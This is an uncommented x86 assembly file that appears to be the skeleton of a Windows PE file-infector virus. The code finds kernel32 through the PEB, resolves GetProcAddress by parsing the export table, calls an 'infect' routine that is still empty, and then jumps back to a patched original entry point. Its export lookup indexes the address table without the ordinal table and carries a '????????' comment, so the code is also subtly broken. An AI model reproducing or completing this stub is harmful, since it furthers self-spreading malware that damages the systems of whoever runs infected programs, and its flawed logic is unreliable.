[bits 32]

start:
push esi
push edi
push ebx
push ecx
push ebp

mov eax, [fs:0x30] 
mov eax, [eax+0xc]
mov eax, [eax+0x14]

mov esi, eax
mov esi, [esi] ; esi Flink
mov esi, [esi] ; esi Flink
mov esi, [esi+0x10]  ; esi == imagebase kernel32.dll

mov eax, [esi+0x3c]  ; e_lfanew
add eax, esi
add eax, 4 + 0x14 + 0x60
mov eax, [eax]  ;
add eax, esi

; eax == export table
mov ebx, [eax+0x1c]
add ebx, esi  ;  ebx == addr table

mov edx, [eax+0x20]
add edx, esi  ;  edx == name table

call _getprocname
db "GetProcAddress", 0
_getprocname:
pop eax  ; address string "GetProcAddress"

mov ebp, esi  ; ebp == imagebase

find_getprocaddr:
  mov esi, [edx]
  add esi, ebp

  mov edi, eax

  mov ecx, 13
  repe cmpsb  ; memcmp("GetProcAddress", edx, 13)

  test ecx, ecx
  jz .found  

  add ebx, 4
  add edx, 4
  jmp find_getprocaddr

.found:
add ebx, 8  ; # ????????

mov ebx, [ebx]
add ebx, ebp

; assume ebx had GetProcAddress

push 0xc0d31235

call next_instr
next_instr:
pop eax
sub eax, next_instr - start
push eax

push ebp
push ebx

call infect
call addr_instr
addr_instr:
pop eax
sub eax, addr_instr - start
sub eax, 0xc0d31234

pop ebp
pop ecx
pop ebx
pop edi
pop esi
jmp eax

infect:









; db "mniam pyszne paczki", 0



